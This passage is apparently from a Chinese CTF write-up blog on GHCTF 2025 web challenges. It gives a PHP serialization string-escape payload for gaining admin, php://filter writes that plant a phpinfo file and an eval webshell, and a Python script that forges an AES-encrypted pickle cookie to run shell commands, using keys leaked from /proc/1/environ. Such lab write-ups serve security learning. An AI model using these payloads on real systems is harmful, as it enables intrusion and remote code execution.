    <span class="token variable">$lists</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sleep"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"and"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"||"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"union"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$lists</span> <span class="token keyword">as</span> <span class="token variable">$list</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">#echo $c;</span>
    <span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>想到了[安洵杯 2019]easy_serialize_php这道题。印象很深因为我当时一直在数那个字符串的个数试图凑出跟wp一样的答案。。。</p>
<p>ww具体的原理自己看吧<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></p>
<p>要多出来<code>";}s:7:"isadmin";b:1}</code>共21个字符，用最短的and(与error差两个)和flag(1个)，即10个and和1个flag。</p>
<p>so,用<code>flagandandandandandandandandandand";s:7:"isadmin";b:1;}</code>当username注册再登就行了，他就会变成下面那样就覆盖了就不用搞token了ww</p>
<pre class="line-numbers language-none"><code class="language-none">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU1OiJlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yZXJyb3JlcnJvcmVycm9yIjtzOjc6ImlzYWRtaW4iO2I6MTt9IjtzOjc6ImlzYWRtaW4iO2I6MDt9fGVhMWVkOWRmNTVkNjJhNzdhNGU0M2JhMTA4ZTBmYzVhNWYzMDc3ZjVmM2Y0NzkxMTVhNTM4MmZiMDJkNWYxYjM=
O:4:"User":2:{s:8:"username";s:55:"errorerrorerrorerrorerrorerrorerrorerrorerrorerrorerror";s:7:"isadmin";b:1;}";s:7:"isadmin";b:0;}|ea1ed9df55d62a77a4e43ba108e0fc5a5f3077f5f3f479115a5382fb02d5f1b3

#被顶出来的";s:7:"isadmin";b:0;}不再执行，payload顺利逃出waf。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/aa05a1a7ccb4777f50b47d5acfaebc56.png"></p>
<p>终于不报错了，我要哭了QAQ</p>
<p>尝试传🐎没效果。。。我恨</p>
<p><del>找了半天不知道哪错了，直到发现忘打开dashboard.php源代码了，呃呃</del></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">isadmin</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tmp/admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        	<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
		<span class="token variable">$content</span> <span class="token operator">.=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hithub/p/16849600.html">伪协议绕过死亡代码</a></p>
<pre class="line-numbers language-none"><code class="language-none">filename=php://filter/write=convert.base64-decode/resource=m.php&amp;txt=aPD9waHAgcGhwaW5mbygpOw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5aec9309f1a45f85d008cb865247190f.png"></p>
<p>okk</p>
<p>写个🐎</p>
<pre class="line-numbers language-none"><code class="language-none">filename=php://filter/write=convert.base64-decode/resource=qaq.php&amp;txt=aPD9waHAgQGV2YWwoJF9QT1NUWyJwYXNzIl0pOw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4a3a4529cb0ba2f98d9c5f8314566d8f.png"></p>
<p>嘻嘻</p>
<hr>
<p>总之这次还有一个教训就是有的不会的可以先放。。。一共7天我可能有四五天在看web3和5，因为总感觉差临门一脚了（</p>
<p>实在不想研究了，感觉自己的知识面还是窄，天知道pickle出来时我一万个后悔，早知道听学姐的把[HFCTF 2021 Final]easyflask给做了，但当时太懒了（</p>
<p>总之出wp在复现一遍吧。。<del>现在对电脑有点PTSD了，要燃成舍利子了。。。</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8c5d17457a5ae0c6b7956c15041953fd.png"></p>
<hr>
<p>sorry我忘加web标签了，祸不单行。。。。。。。。。。。。。。。。。。。。这有什么改的方法吗（哭</p>
<hr>
<p>官方wp：[GHCTF2025 Web Write Up.pdf](file:///D:/Downloads/GHCTF2025 Web Write Up.pdf)</p>
<h3 id="GHCTF-2025-ezzzz-pickle"><a href="#GHCTF-2025-ezzzz-pickle" class="headerlink" title="[GHCTF 2025]ezzzz_pickle"></a>[GHCTF 2025]ezzzz_pickle</h3><blockquote>
<p>在 <code>/proc</code> 下，每个正在运行的进程都有一个以其进程 ID（<code>pid</code>）命名的目录。例如，<code>/proc/1</code> 对应进程 ID 为 1 的进程。<code>/proc/[pid]/environ</code> 文件存储了对应进程的环境变量信息。</p>
<p>进程的环境变量包含了许多重要信息，如系统路径（<code>PATH</code>）、用户信息（<code>USER</code>、<code>HOME</code>）、语言设置（<code>LANG</code>）等，这些环境变量会影响进程的运行方式和行为。</p>
<p>进程 ID 为 1 的进程通常是系统初始化进程（在传统的 SysV init 系统中是 <code>init</code> 进程，在使用 systemd 的系统中是 <code>systemd</code> 进程），它是所有其他进程的祖先进程，负责启动和管理系统的其他进程。</p>
</blockquote>
<p>弱密码</p>
<p>环境变量读取，同是<code>/docker-entrypoint.sh</code>，或者读取<code>/proc/1/environ</code></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Junglezt/p/18117469">文件包含之/proc/self/environ - Junglezt - 博客园</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#从环境变量获取密钥和IV</span>
    key <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;SECRET_key&amp;#39;).encode()</span>
    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;SECRET_iv&amp;#39;).encode()</span>
    <span class="token keyword">return</span> key<span class="token punctuation">,</span> iv



<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;):</span>

    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#CBC模式需要确保IV是随机且不可预测的，但这里IV是从环境变量获取的固定值，每次加密使用相同的IV，这会带来安全隐患</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>

        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#39;decrypt&amp;#39;:</span>
        decryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>

        encrypted_data_bytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        decrypted_data <span class="token operator">=</span> decryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>encrypted_data_bytes<span class="token punctuation">)</span> <span class="token operator">+</span> decryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>

        unpadder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>unpadder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        unpadded_data <span class="token operator">=</span> unpadder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>decrypted_data<span class="token punctuation">)</span> <span class="token operator">+</span> unpadder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> unpadded_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

users <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token operator">&amp;</span><span class="token comment">#34;admin&amp;#34;: &amp;#34;admin123&amp;#34;,</span>
<span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>

    session_data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;: username,</span>
        <span class="token operator">&amp;</span><span class="token comment">#34;expires&amp;#34;: time.time() + 3600  </span>
    <span class="token punctuation">}</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_data<span class="token punctuation">)</span><span class="token comment">#pickle序列化会话数据</span>
    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;utf-8&amp;#39;)#使用 base64.b64encode() 方法对序列化后的数据进行 Base64 编码，然后使用 decode() 方法将编码后的字节数据解码为字符串 pickled_data。</span>

    key<span class="token punctuation">,</span>iv<span class="token operator">=</span>generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session<span class="token operator">=</span>aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;encrypt&amp;#39;)#AES加密</span>


    <span class="token keyword">return</span> session

<span class="token keyword">def</span> <span class="token function">dowload_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;static&amp;#34;,filename)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token comment">#39;rb&amp;#39;) as f:</span>
        data<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#39;utf-8&amp;#39;)</span>
    <span class="token keyword">return</span> data
<span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#39;decrypt&amp;#39;)</span>
        pickled_data<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>


        session_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;] !=&amp;#34;admin&amp;#34;:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;expires&amp;#34;] &amp;gt; time.time() else False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/&amp;#34;,methods=[&amp;#39;GET&amp;#39;,&amp;#39;POST&amp;#39;])</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> <span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34; in request.cookies:</span>
        session <span class="token operator">=</span> validate_session<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;])</span>
        <span class="token keyword">if</span> session<span class="token punctuation">:</span>
            data<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#34;&amp;#34;</span>
            filename<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;filename&amp;#34;)</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
                data<span class="token operator">=</span>dowload_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;index.html&amp;#34;,name=session[&amp;#39;username&amp;#39;],file_data=data)</span>

    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#34;POST&amp;#34;:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;username&amp;#34;)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;password&amp;#34;)</span>

        <span class="token keyword">if</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>
            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/&amp;#34;))</span>

            resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;, create_session(username))</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;login.html&amp;#34;,error=&amp;#34;Invalid username or password&amp;#34;)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;login.html&amp;#34;)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/logout&amp;#34;)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;/login&amp;#34;))</span>
    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#34;session&amp;#34;)</span>
    <span class="token keyword">return</span> resp

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token operator">&amp;</span><span class="token comment">#34;__main__&amp;#34;:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment">#34;0.0.0.0&amp;#34;,debug=False)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">PYTHON_SHA256<span class="token operator">=</span>bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1
HOSTNAME<span class="token operator">=</span>6172baf993ab4edf
PYTHON_VERSION<span class="token operator">=</span><span class="token number">3.10</span><span class="token number">.16</span>
PWD<span class="token operator">=</span><span class="token operator">/</span>app
HOME<span class="token operator">=</span><span class="token operator">/</span>root
LANG<span class="token operator">=</span>C<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span>
GPG_KEY<span class="token operator">=</span>A035C8C19219BA821ECEA86B64E628F8D684696D
FLAG<span class="token operator">=</span>no_FLAG
SECRET_key<span class="token operator">=</span>ajwdopldwjdowpajdmslkmwjrfhgnbbv
SHLVL<span class="token operator">=</span><span class="token number">1</span>
PATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span><span class="token builtin">bin</span>
SECRET_iv<span class="token operator">=</span>asdwdggiouewhgpw
_<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>flask
OLDPWD<span class="token operator">=</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将fake_flag.txt移除并重创一个新的并写进ls /</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7032?time__1311=YqfxgD2D0A0=DtD/WrWqiqSxjhl8qkHHa4D&amp;u_atoken=8ce8b2be4a626f7c63df82432c7d562a&amp;u_asig=1a0c399f17418658718784440e003f">文章 - pickle反序列化初探 - 先知社区</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

<span class="token comment"># 生成密钥和IV</span>
<span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    KEY <span class="token operator">=</span> <span class="token string">"ajwdopldwjdowpajdmslkmwjrfhgnbbv"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    IV <span class="token operator">=</span> <span class="token string">"asdwdggiouewhgpw"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> KEY<span class="token punctuation">,</span> IV


<span class="token comment"># AES加密函数</span>
<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padder <span class="token operator">=</span> padding<span class="token punctuation">.</span>PKCS7<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">.</span>padder<span class="token punctuation">(</span><span class="token punctuation">)</span>
        padded_data <span class="token operator">=</span> padder<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> padder<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> encryptor<span class="token punctuation">.</span>update<span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span> <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>finalize<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># 创建恶意session</span>
<span class="token keyword">def</span> <span class="token function">create_malicious_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 创建恶意的python对象</span>
<span class="token comment">#reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了，按理说这里用reduce也行，但试了下不行，这是为什么？？？</span>
    opcode <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''(cos
system
S'ls / &gt; /app/static/fake_flag.txt'
o.'''</span>
    <span class="token comment"># Base64编码</span>
    pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

    <span class="token comment"># AES加密</span>
    key<span class="token punctuation">,</span> iv <span class="token operator">=</span> generate_key_iv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    encrypted_session <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>pickled_data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> encrypted_session


<span class="token comment"># 生成恶意cookie</span>
malicious_cookie <span class="token operator">=</span> create_malicious_session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"恶意Cookie值:"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>malicious_cookie<span class="token punctuation">)</span>
